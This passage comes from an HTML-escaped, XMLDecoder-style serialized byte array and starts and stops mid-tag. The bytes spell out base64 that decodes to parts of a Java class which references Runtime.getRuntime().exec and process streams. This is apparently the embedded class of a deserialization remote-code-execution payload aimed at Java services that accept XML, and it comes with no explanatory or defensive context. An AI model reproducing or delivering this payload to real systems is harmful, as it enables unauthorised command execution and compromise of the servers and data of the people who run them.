index="3117"&gt;&lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="3118"&gt;&lt;byte&gt;76&lt;/byte&gt;&lt;/void&gt;&lt;void index="3119"&gt;&lt;byte&gt;49&lt;/byte&gt;&lt;/void&gt;&lt;void index="3120"&gt;&lt;byte&gt;78&lt;/byte&gt;&lt;/void&gt;&lt;void index="3121"&gt;&lt;byte&gt;48&lt;/byte&gt;&lt;/void&gt;&lt;void index="3122"&gt;&lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="3123"&gt;&lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="3124"&gt;&lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="3125"&gt;&lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="3126"&gt;&lt;byte&gt;90&lt;/byte&gt;&lt;/void&gt;&lt;void index="3127"&gt;&lt;byte&gt;122&lt;/byte&gt;&lt;/void&gt;&lt;void index="3128"&gt;&lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="3129"&gt;&lt;byte&gt;66&lt;/byte&gt;&lt;/void&gt;&lt;void index="3130"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="3131"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="3132"&gt;&lt;byte&gt;104&lt;/byte&gt;&lt;/void&gt;&lt;void index="3133"&gt;&lt;byte&gt;106&lt;/byte&gt;&lt;/void&gt;&lt;void index="3134"&gt;&lt;byte&gt;98&lt;/byte&gt;&lt;/void&gt;&lt;void index="3135"&gt;&lt;byte&gt;50&lt;/byte&gt;&lt;/void&gt;&lt;void index="3136"&gt;&lt;byte&gt;53&lt;/byte&gt;&lt;/void&gt;&lt;void index="3137"&gt;&lt;byte&gt;48&lt;/byte&gt;&lt;/void&gt;&lt;void index="3138"&gt;&lt;byte&gt;89&lt;/byte&gt;&lt;/void&gt;&lt;void index="3139"&gt;&lt;byte&gt;87&lt;/byte&gt;&lt;/void&gt;&lt;void index="3140"&gt;&lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="3141"&gt;&lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="3142"&gt;&lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="3143"&gt;&lt;byte&gt;119&lt;/byte&gt;&lt;/void&gt;&lt;void index="3144"&gt;&lt;byte&gt;69&lt;/byte&gt;&lt;/void&gt;&lt;void index="3145"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="3146"&gt;&lt;byte&gt;71&lt;/byte&gt;&lt;/void&gt;&lt;void index="3147"&gt;&lt;byte&gt;121&lt;/byte&gt;&lt;/void&gt;&lt;void index="3148"&gt;&lt;byte&gt;104&lt;/byte&gt;&lt;/void&gt;&lt;void index="3149"&gt;&lt;byte&gt;77&lt;/byte&gt;&lt;/void&gt;&lt;void index="3150"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="3151"&gt;&lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="3152"&gt;&lt;byte&gt;70&lt;/byte&gt;&lt;/void&gt;&lt;void index="3153"&gt;&lt;byte&gt;50&lt;/byte&gt;&lt;/void&gt;&lt;void index="3154"&gt;&lt;byte&gt;89&lt;/byte&gt;&lt;/void&gt;&lt;void index="3155"&gt;&lt;byte&gt;83&lt;/byte&gt;&lt;/void&gt;&lt;void index="3156"&gt;&lt;byte&gt;57&lt;/byte&gt;&lt;/void&gt;&lt;void index="3157"&gt;&lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="3158"&gt;&lt;byte&gt;89&lt;/byte&gt;&lt;/void&gt;&lt;void index="3159"&gt;&lt;byte&gt;87&lt;/byte&gt;&lt;/void&gt;&lt;void index="3160"&gt;&lt;byte&gt;53&lt;/byte&gt;&lt;/void&gt;&lt;void index="3161"&gt;&lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="3162"&gt;&lt;byte&gt;76&lt;/byte&gt;&lt;/void&gt;&lt;void index="3163"&gt;&lt;byte&gt;48&lt;/byte&gt;&lt;/void&gt;&lt;void index="3164"&gt;&lt;byte&gt;78&lt;/byte&gt;&lt;/void&gt;&lt;void index="3165"&gt;&lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="3166"&gt;&lt;byte&gt;89&lt;/byte&gt;&lt;/void&gt;&lt;void index="3167"&gt;&lt;byte&gt;88&lt;/byte&gt;&lt;/void&gt;&lt;void index="3168"&gt;&lt;byte&gt;74&lt;/byte&gt;&lt;/void&gt;&lt;void index="3169"&gt;&lt;byte&gt;84&lt;/byte&gt;&lt;/void&gt;&lt;void index="3170"&gt;&lt;byte&gt;90&lt;/byte&gt;&lt;/void&gt;&lt;void index="3171"&gt;&lt;byte&gt;88&lt;/byte&gt;&lt;/void&gt;&lt;void index="3172"&gt;&lt;byte&gt;70&lt;/byte&gt;&lt;/void&gt;&lt;void index="3173"&gt;&lt;byte&gt;49&lt;/byte&gt;&lt;/void&gt;&lt;void index="3174"&gt;&lt;byte&gt;90&lt;/byte&gt;&lt;/void&gt;&lt;void index="3175"&gt;&lt;byte&gt;87&lt;/byte&gt;&lt;/void&gt;&lt;void index="3176"&gt;&lt;byte&gt;53&lt;/byte&gt;&lt;/void&gt;&lt;void index="3177"&gt;&lt;byte&gt;106&lt;/byte&gt;&lt;/void&gt;&lt;void index="3178"&gt;&lt;byte&gt;90&lt;/byte&gt;&lt;/void&gt;&lt;void index="3179"&gt;&lt;byte&gt;84&lt;/byte&gt;&lt;/void&gt;&lt;void index="3180"&gt;&lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="3181"&gt;&lt;byte&gt;112&lt;/byte&gt;&lt;/void&gt;&lt;void index="3182"&gt;&lt;byte&gt;87&lt;/byte&gt;&lt;/void&gt;&lt;void index="3183"&gt;&lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="3184"&gt;&lt;byte&gt;69&lt;/byte&gt;&lt;/void&gt;&lt;void index="3185"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="3186"&gt;&lt;byte&gt;69&lt;/byte&gt;&lt;/void&gt;&lt;void index="3187"&gt;&lt;byte&gt;87&lt;/byte&gt;&lt;/void&gt;&lt;void index="3188"&gt;&lt;byte&gt;112&lt;/byte&gt;&lt;/void&gt;&lt;void index="3189"&gt;&lt;byte&gt;104&lt;/byte&gt;&lt;/void&gt;&lt;void index="3190"&gt;&lt;byte&gt;100&lt;/byte&gt;&lt;/void&gt;&lt;void index="3191"&gt;&lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="3192"&gt;&lt;byte&gt;69&lt;/byte&gt;&lt;/void&gt;&lt;void index="3193"&gt;&lt;byte&gt;118&lt;/byte&gt;&lt;/void&gt;&lt;void index="3194"&gt;&lt;byte&gt;98&lt;/byte&gt;&lt;/void&gt;&lt;void index="3195"&gt;&lt;byte&gt;71&lt;/byte&gt;&lt;/void&gt;&lt;void index="3196"&gt;&lt;byte&gt;70&lt;/byte&gt;&lt;/void&gt;&lt;void index="3197"&gt;&lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="3198"&gt;&lt;byte&gt;90&lt;/byte&gt;&lt;/void&gt;&lt;void index="3199"&gt;&lt;byte&gt;121&lt;/byte&gt;&lt;/void&gt;&lt;void index="3200"&gt;&lt;byte&gt;57&lt;/byte&gt;&lt;/void&gt;&lt;void index="3201"&gt;&lt;byte&gt;83&lt;/byte&gt;&lt;/void&gt;&lt;void index="3202"&gt;&lt;byte&gt;100&lt;/byte&gt;&lt;/void&gt;&lt;void index="3203"&gt;&lt;byte&gt;87&lt;/byte&gt;&lt;/void&gt;&lt;void index="3204"&gt;&lt;byte&gt;53&lt;/byte&gt;&lt;/void&gt;&lt;void index="3205"&gt;&lt;byte&gt;48&lt;/byte&gt;&lt;/void&gt;&lt;void index="3206"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="3207"&gt;&lt;byte&gt;87&lt;/byte&gt;&lt;/void&gt;&lt;void index="3208"&gt;&lt;byte&gt;49&lt;/byte&gt;&lt;/void&gt;&lt;void index="3209"&gt;&lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="3210"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="3211"&gt;&lt;byte&gt;81&lt;/byte&gt;&lt;/void&gt;&lt;void index="3212"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="3213"&gt;&lt;byte&gt;75&lt;/byte&gt;&lt;/void&gt;&lt;void index="3214"&gt;&lt;byte&gt;90&lt;/byte&gt;&lt;/void&gt;&lt;void index="3215"&gt;&lt;byte&gt;50&lt;/byte&gt;&lt;/void&gt;&lt;void index="3216"&gt;&lt;byte&gt;86&lt;/byte&gt;&lt;/void&gt;&lt;void index="3217"&gt;&lt;byte&gt;48&lt;/byte&gt;&lt;/void&gt;&lt;void index="3218"&gt;&lt;byte&gt;85&lt;/byte&gt;&lt;/void&gt;&lt;void index="3219"&gt;&lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="3220"&gt;&lt;byte&gt;86&lt;/byte&gt;&lt;/void&gt;&lt;void index="3221"&gt;&lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="3222"&gt;&lt;byte&gt;100&lt;/byte&gt;&lt;/void&gt;&lt;void index="3223"&gt;&lt;byte&gt;71&lt;/byte&gt;&lt;/void&gt;&lt;void index="3224"&gt;&lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="3225"&gt;&lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="3226"&gt;&lt;byte&gt;90&lt;/byte&gt;&lt;/void&gt;&lt;void index="3227"&gt;&lt;byte&gt;81&lt;/byte&gt;&lt;/void&gt;&lt;void index="3228"&gt;&lt;byte&gt;69&lt;/byte&gt;&lt;/void&gt;&lt;void index="3229"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="3230"&gt;&lt;byte&gt;70&lt;/byte&gt;&lt;/void&gt;&lt;void index="3231"&gt;&lt;byte&gt;83&lt;/byte&gt;&lt;/void&gt;&lt;void index="3232"&gt;&lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="3233"&gt;&lt;byte&gt;112&lt;/byte&gt;&lt;/void&gt;&lt;void index="3234"&gt;&lt;byte&gt;84&lt;/byte&gt;&lt;/void&gt;&lt;void index="3235"&gt;&lt;byte&gt;71&lt;/byte&gt;&lt;/void&gt;&lt;void index="3236"&gt;&lt;byte&gt;112&lt;/byte&gt;&lt;/void&gt;&lt;void index="3237"&gt;&lt;byte&gt;104&lt;/byte&gt;&lt;/void&gt;&lt;void index="3238"&gt;&lt;byte&gt;100&lt;/byte&gt;&lt;/void&gt;&lt;void index="3239"&gt;&lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="3240"&gt;&lt;byte&gt;69&lt;/byte&gt;&lt;/void&gt;&lt;void index="3241"&gt;&lt;byte&gt;118&lt;/byte&gt;&lt;/void&gt;&lt;void index="3242"&gt;&lt;byte&gt;98&lt;/byte&gt;&lt;/void&gt;&lt;void index="3243"&gt;&lt;byte&gt;71&lt;/byte&gt;&lt;/void&gt;&lt;void index="3244"&gt;&lt;byte&gt;70&lt;/byte&gt;&lt;/void&gt;&lt;void index="3245"&gt;&lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="3246"&gt;&lt;byte&gt;90&lt;/byte&gt;&lt;/void&gt;&lt;void index="3247"&gt;&lt;byte&gt;121&lt;/byte&gt;&lt;/void&gt;&lt;void index="3248"&gt;&lt;byte&gt;57&lt;/byte&gt;&lt;/void&gt;&lt;void index="3249"&gt;&lt;byte&gt;83&lt;/byte&gt;&lt;/void&gt;&lt;void index="3250"&gt;&lt;byte&gt;100&lt;/byte&gt;&lt;/void&gt;&lt;void index="3251"&gt;&lt;byte&gt;87&lt;/byte&gt;&lt;/void&gt;&lt;void index="3252"&gt;&lt;byte&gt;53&lt;/byte&gt;&lt;/void&gt;&lt;void index="3253"&gt;&lt;byte&gt;48&lt;/byte&gt;&lt;/void&gt;&lt;void index="3254"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="3255"&gt;&lt;byte&gt;87&lt;/byte&gt;&lt;/void&gt;&lt;void index="3256"&gt;&lt;byte&gt;49&lt;/byte&gt;&lt;/void&gt;&lt;void index="3257"&gt;&lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="3258"&gt;&lt;byte&gt;79&lt;/byte&gt;&lt;/void&gt;&lt;void index="3259"&gt;&lt;byte&gt;119&lt;/byte&gt;&lt;/void&gt;&lt;void index="3260"&gt;&lt;byte&gt;69&lt;/byte&gt;&lt;/void&gt;&lt;void index="3261"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="3262"&gt;&lt;byte&gt;66&lt;/byte&gt;&lt;/void&gt;&lt;void index="3263"&gt;&lt;byte&gt;71&lt;/byte&gt;&lt;/void&gt;&lt;void index="3264"&gt;&lt;byte&gt;86&lt;/byte&gt;&lt;/void&gt;&lt;void index="3265"&gt;&lt;byte&gt;52&lt;/byte&gt;&lt;/void&gt;&lt;void index="3266"&gt;&lt;byte&gt;90&lt;/byte&gt;&lt;/void&gt;&lt;void index="3267"&gt;&lt;byte&gt;87&lt;/byte&gt;&lt;/void&gt;&lt;void index="3268"&gt;&lt;byte&gt;77&lt;/byte&gt;&lt;/void&gt;&lt;void index="3269"&gt;&lt;byte&gt;66&lt;/byte&gt;&lt;/void&gt;&lt;void index="3270"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="3271"&gt;&lt;byte&gt;67&lt;/byte&gt;&lt;/void&gt;&lt;void index="3272"&gt;&lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="3273"&gt;&lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="3274"&gt;&lt;byte&gt;87&lt;/byte&gt;&lt;/void&gt;&lt;void index="3275"&gt;&lt;byte&gt;48&lt;/byte&gt;&lt;/void&gt;&lt;void index="3276"&gt;&lt;byte&gt;120&lt;/byte&gt;&lt;/void&gt;&lt;void index="3277"&gt;&lt;byte&gt;113&lt;/byte&gt;&lt;/void&gt;&lt;void index="3278"&gt;&lt;byte&gt;89&lt;/byte&gt;&lt;/void&gt;&lt;void index="3279"&gt;&lt;byte&gt;88&lt;/byte&gt;&lt;/void&gt;&lt;void index="3280"&gt;&lt;byte&gt;90&lt;/byte&gt;&lt;/void&gt;&lt;void index="3281"&gt;&lt;byte&gt;104&lt;/byte&gt;&lt;/void&gt;&lt;void index="3282"&gt;&lt;byte&gt;76&lt;/byte&gt;&lt;/void&gt;&lt;void index="3283"&gt;&lt;byte&gt;50&lt;/byte&gt;&lt;/void&gt;&lt;void index="3284"&gt;&lt;byte&gt;120&lt;/byte&gt;&lt;/void&gt;&lt;void index="3285"&gt;&lt;byte&gt;104&lt;/byte&gt;&lt;/void&gt;&lt;void index="3286"&gt;&lt;byte&gt;98&lt;/byte&gt;&lt;/void&gt;&lt;void index="3287"&gt;&lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="3288"&gt;&lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="3289"&gt;&lt;byte&gt;118&lt;/byte&gt;&lt;/void&gt;&lt;void index="3290"&gt;&lt;byte&gt;85&lt;/byte&gt;&lt;/void&gt;&lt;void index="3291"&gt;&lt;byte&gt;51&lt;/byte&gt;&lt;/void&gt;&lt;void index="3292"&gt;&lt;byte&gt;82&lt;/byte&gt;&lt;/void&gt;&lt;void index="3293"&gt;&lt;byte&gt;121&lt;/byte&gt;&lt;/void&gt;&lt;void index="3294"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="3295"&gt;&lt;byte&gt;87&lt;/byte&gt;&lt;/void&gt;&lt;void index="3296"&gt;&lt;byte&gt;53&lt;/byte&gt;&lt;/void&gt;&lt;void index="3297"&gt;&lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="3298"&gt;&lt;byte&gt;79&lt;/byte&gt;&lt;/void&gt;&lt;void index="3299"&gt;&lt;byte&gt;121&lt;/byte&gt;&lt;/void&gt;&lt;void index="3300"&gt;&lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="3301"&gt;&lt;byte&gt;77&lt;/byte&gt;&lt;/void&gt;&lt;void index="3302"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="3303"&gt;&lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="3304"&gt;&lt;byte&gt;70&lt;/byte&gt;&lt;/void&gt;&lt;void index="3305"&gt;&lt;byte&gt;50&lt;/byte&gt;&lt;/void&gt;&lt;void index="3306"&gt;&lt;byte&gt;89&lt;/byte&gt;&lt;/void&gt;&lt;void index="3307"&gt;&lt;byte&gt;83&lt;/byte&gt;&lt;/void&gt;&lt;void index="3308"&gt;&lt;byte&gt;57&lt;/byte&gt;&lt;/void&gt;&lt;void index="3309"&gt;&lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="3310"&gt;&lt;byte&gt;89&lt;/byte&gt;&lt;/void&gt;&lt;void index="3311"&gt;&lt;byte&gt;87&lt;/byte&gt;&lt;/void&gt;&lt;void index="3312"&gt;&lt;byte&gt;53&lt;/byte&gt;&lt;/void&gt;&lt;void index="3313"&gt;&lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="3314"&gt;&lt;byte&gt;76&lt;/byte&gt;&lt;/void&gt;&lt;void index="3315"&gt;&lt;byte&gt;49&lt;/byte&gt;&lt;/void&gt;&lt;void index="3316"&gt;&lt;byte&gt;66&lt;/byte&gt;&lt;/void&gt;&lt;void index="3317"&gt;&lt;byte&gt;121&lt;/byte&gt;&lt;/void&gt;&lt;void index="3318"&gt;&lt;byte&gt;98&lt;/byte&gt;&lt;/void&gt;&lt;void index="3319"&gt;&lt;byte&gt;50&lt;/byte&gt;&lt;/void&gt;&lt;void index="3320"&gt;&lt;byte&gt;78&lt;/byte&gt;&lt;/void&gt;&lt;void index="3321"&gt;&lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="3322"&gt;&lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="3323"&gt;&lt;byte&gt;51&lt;/byte&gt;&lt;/void&gt;&lt;void index="3324"&gt;&lt;byte&gt;77&lt;/byte&gt;&lt;/void&gt;&lt;void index="3325"&gt;&lt;byte&gt;55&lt;/byte&gt;&lt;/void&gt;&lt;void index="3326"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="3327"&gt;&lt;byte&gt;81&lt;/byte&gt;&lt;/void&gt;&lt;void index="3328"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="3329"&gt;&lt;byte&gt;79&lt;/byte&gt;&lt;/void&gt;&lt;void index="3330"&gt;&lt;byte&gt;90&lt;/byte&gt;&lt;/void&gt;&lt;void index="3331"&gt;&lt;byte&gt;50&lt;/byte&gt;&lt;/void&gt;&lt;void index="3332"&gt;&lt;byte&gt;86&lt;/byte&gt;&lt;/void&gt;&lt;void index="3333"&gt;&lt;byte&gt;48&lt;/byte&gt;&lt;/void&gt;&lt;void index="3334"&gt;&lt;byte&gt;83&lt;/byte&gt;&lt;/void&gt;&lt;void index="3335"&gt;&lt;byte&gt;87&lt;/byte&gt;&lt;/void&gt;&lt;void index="3336"&gt;&lt;byte&gt;53&lt;/byte&gt;&lt;/void&gt;&lt;void index="3337"&gt;&lt;byte&gt;119&lt;/byte&gt;&lt;/void&gt;&lt;void index="3338"&gt;&lt;byte&gt;100&lt;/byte&gt;&lt;/void&gt;&lt;void index="3339"&gt;&lt;byte&gt;88&lt;/byte&gt;&lt;/void&gt;&lt;void index="3340"&gt;&lt;byte&gt;82&lt;/byte&gt;&lt;/void&gt;&lt;void index="3341"&gt;&lt;byte&gt;84&lt;/byte&gt;&lt;/void&gt;&lt;void index="3342"&gt;&lt;byte&gt;100&lt;/byte&gt;&lt;/void&gt;&lt;void index="3343"&gt;&lt;byte&gt;72&lt;/byte&gt;&lt;/void&gt;&lt;void index="3344"&gt;&lt;byte&gt;74&lt;/byte&gt;&lt;/void&gt;&lt;void index="3345"&gt;&lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="3346"&gt;&lt;byte&gt;89&lt;/byte&gt;&lt;/void&gt;&lt;void index="3347"&gt;&lt;byte&gt;87&lt;/byte&gt;&lt;/void&gt;&lt;void index="3348"&gt;&lt;byte&gt;48&lt;/byte&gt;&lt;/void&gt;&lt;void index="3349"&gt;&lt;byte&gt;66&lt;/byte&gt;&lt;/void&gt;&lt;void index="3350"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="3351"&gt;&lt;byte&gt;66&lt;/byte&gt;&lt;/void&gt;&lt;void index="3352"&gt;&lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="3353"&gt;&lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="3354"&gt;&lt;byte&gt;75&lt;/byte&gt;&lt;/void&gt;&lt;void index="3355"&gt;&lt;byte&gt;85&lt;/byte&gt;&lt;/void&gt;&lt;void index="3356"&gt;&lt;byte&gt;120&lt;/byte&gt;&lt;/void&gt;&lt;void index="3357"&gt;&lt;byte&gt;113&lt;/byte&gt;&lt;/void&gt;&lt;void index="3358"&gt;&lt;byte&gt;89&lt;/byte&gt;&lt;/void&gt;&lt;void index="3359"&gt;&lt;byte&gt;88&lt;/byte&gt;&lt;/void&gt;&lt;void index="3360"&gt;&lt;byte&gt;90&lt;/byte&gt;&lt;/void&gt;&lt;void index="3361"&gt;&lt;byte&gt;104&lt;/byte&gt;&lt;/void&gt;&lt;void index="3362"&gt;&lt;byte&gt;76&lt;/byte&gt;&lt;/void&gt;&lt;void index="3363"&gt;&lt;byte&gt;50&lt;/byte&gt;&lt;/void&gt;&lt;void index="3364"&gt;&lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="3365"&gt;&lt;byte&gt;118&lt;/byte&gt;&lt;/void&gt;&lt;void index="3366"&gt;&lt;byte&gt;76&lt;/byte&gt;&lt;/void&gt;&lt;void index="3367"&gt;&lt;byte&gt;48&lt;/byte&gt;&lt;/void&gt;&lt;void index="3368"&gt;&lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="3369"&gt;&lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="3370"&gt;&lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="3371"&gt;&lt;byte&gt;72&lt;/byte&gt;&lt;/void&gt;&lt;void index="3372"&gt;&lt;byte&gt;86&lt;/byte&gt;&lt;/void&gt;&lt;void index="3373"&gt;&lt;byte&gt;48&lt;/byte&gt;&lt;/void&gt;&lt;void index="3374"&gt;&lt;byte&gt;85&lt;/byte&gt;&lt;/void&gt;&lt;void index="3375"&gt;&lt;byte&gt;51&lt;/byte&gt;&lt;/void&gt;&lt;void index="3376"&gt;&lt;byte&gt;82&lt;/byte&gt;&lt;/void&gt;&lt;void index="3377"&gt;&lt;byte&gt;121&lt;/byte&gt;&lt;/void&gt;&lt;void index="3378"&gt;&lt;byte&gt;90&lt;/byte&gt;&lt;/void&gt;&lt;void index="3379"&gt;&lt;byte&gt;87&lt;/byte&gt;&lt;/void&gt;&lt;void index="3380"&gt;&lt;byte&gt;70&lt;/byte&gt;&lt;/void&gt;&lt;void index="3381"&gt;&lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="3382"&gt;&lt;byte&gt;79&lt;/byte&gt;&lt;/void&gt;&lt;void index="3383"&gt;&lt;byte&gt;119&lt;/byte&gt;&lt;/void&gt;&lt;void index="3384"&gt;&lt;byte&gt;69&lt;/byte&gt;&lt;/void&gt;&lt;void index="3385"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="3386"&gt;&lt;byte&gt;71&lt;/byte&gt;&lt;/void&gt;&lt;void index="3387"&gt;&lt;byte&gt;67&lt;/byte&gt;&lt;/void&gt;&lt;void index="3388"&gt;&lt;byte&gt;104&lt;/byte&gt;&lt;/void&gt;&lt;void index="3389"&gt;&lt;byte&gt;77&lt;/byte&gt;&lt;/void&gt;&lt;void index="3390"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="3391"&gt;&lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="3392"&gt;&lt;byte&gt;70&lt;/byte&gt;&lt;/void&gt;&lt;void index="3393"&gt;&lt;byte&gt;50&lt;/byte&gt;&lt;/void&gt;&lt;void index="3394"&gt;&lt;byte&gt;89&lt;/byte&gt;&lt;/void&gt;&lt;void index="3395"&gt;&lt;byte&gt;83&lt;/byte&gt;&lt;/void&gt;&lt;void index="3396"&gt;&lt;byte&gt;57&lt;/byte&gt;&lt;/void&gt;&lt;void index="3397"&gt;&lt;byte&gt;112&lt;/byte&gt;&lt;/void&gt;&lt;void index="3398"&gt;&lt;byte&gt;98&lt;/byte&gt;&lt;/void&gt;&lt;void index="3399"&gt;&lt;byte&gt;121&lt;/byte&gt;&lt;/void&gt;&lt;void index="3400"&gt;&lt;byte&gt;57&lt;/byte&gt;&lt;/void&gt;&lt;void index="3401"&gt;&lt;byte&gt;74&lt;/byte&gt;&lt;/void&gt;&lt;void index="3402"&gt;&lt;byte&gt;98&lt;/byte&gt;&lt;/void&gt;&lt;void index="3403"&gt;&lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="3404"&gt;&lt;byte&gt;66&lt;/byte&gt;&lt;/void&gt;&lt;void index="3405"&gt;&lt;byte&gt;49&lt;/byte&gt;&lt;/void&gt;&lt;void index="3406"&gt;&lt;byte&gt;100&lt;/byte&gt;&lt;/void&gt;&lt;void index="3407"&gt;&lt;byte&gt;70&lt;/byte&gt;&lt;/void&gt;&lt;void index="3408"&gt;&lt;byte&gt;78&lt;/byte&gt;&lt;/void&gt;&lt;void index="3409"&gt;&lt;byte&gt;48&lt;/byte&gt;&lt;/void&gt;&lt;void index="3410"&gt;&lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="3411"&gt;&lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="3412"&gt;&lt;byte&gt;86&lt;/byte&gt;&lt;/void&gt;&lt;void index="3413"&gt;&lt;byte&gt;104&lt;/byte&gt;&lt;/void&gt;&lt;void index="3414"&gt;&lt;byte&gt;98&lt;/byte&gt;&lt;/void&gt;&lt;void index="3415"&gt;&lt;byte&gt;84&lt;/byte&gt;&lt;/void&gt;&lt;void index="3416"&gt;&lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="3417"&gt;&lt;byte&gt;112&lt;/byte&gt;&lt;/void&gt;&lt;void index="3418"&gt;&lt;byte&gt;86&lt;/byte&gt;&lt;/void&gt;&lt;void index="3419"&gt;&lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="3420"&gt;&lt;byte&gt;69&lt;/byte&gt;&lt;/void&gt;&lt;void index="3421"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="3422"&gt;&lt;byte&gt;69&lt;/byte&gt;&lt;/void&gt;&lt;void index="3423"&gt;&lt;byte&gt;121&lt;/byte&gt;&lt;/void&gt;&lt;void index="3424"&gt;&lt;byte&gt;104&lt;/byte&gt;&lt;/void&gt;&lt;void index="3425"&gt;&lt;byte&gt;77&lt;/byte&gt;&lt;/void&gt;&lt;void index="3426"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="3427"&gt;&lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="3428"&gt;&lt;byte&gt;70&lt;/byte&gt;&lt;/void&gt;&lt;void index="3429"&gt;&lt;byte&gt;50&lt;/byte&gt;&lt;/void&gt;&lt;void index="3430"&gt;&lt;byte&gt;89&lt;/byte&gt;&lt;/void&gt;&lt;void index="3431"&gt;&lt;byte&gt;83&lt;/byte&gt;&lt;/void&gt;&lt;void index="3432"&gt;&lt;byte&gt;57&lt;/byte&gt;&lt;/void&gt;&lt;void index="3433"&gt;&lt;byte&gt;112&lt;/byte&gt;&lt;/void&gt;&lt;void index="3434"&gt;&lt;byte&gt;98&lt;/byte&gt;&lt;/void&gt;&lt;void index="3435"&gt;&lt;byte&gt;121&lt;/byte&gt;&lt;/void&gt;&lt;void index="3436"&gt;&lt;byte&gt;57&lt;/byte&gt;&lt;/void&gt;&lt;void index="3437"&gt;&lt;byte&gt;83&lt;/byte&gt;&lt;/void&gt;&lt;void index="3438"&gt;&lt;byte&gt;90&lt;/byte&gt;&lt;/void&gt;&lt;void index="3439"&gt;&lt;byte&gt;87&lt;/byte&gt;&lt;/void&gt;&lt;void index="3440"&gt;&lt;byte&gt;70&lt;/byte&gt;&lt;/void&gt;&lt;void index="3441"&gt;&lt;byte&gt;107&lt;/byte&gt;&lt;/void&gt;&lt;void index="3442"&gt;&lt;byte&gt;90&lt;/byte&gt;&lt;/void&gt;&lt;void 